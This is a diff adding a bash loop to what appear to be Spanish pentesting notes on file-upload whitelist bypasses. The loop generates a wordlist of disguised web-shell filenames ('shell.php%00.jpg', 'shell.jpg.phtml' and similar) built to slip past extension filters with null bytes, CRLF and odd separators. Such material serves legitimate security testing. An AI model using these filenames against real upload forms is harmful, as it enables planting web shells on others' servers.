@@ -27,3 +27,14 @@ Los Polyglots son probablemente la técnica más elegante ante una lista blanca 
 
 
 ___
+
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do                                                                                  5s
+    for ext in '.php' '.phps' '.phar' '.pht' '.phtml' '.inc' ; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
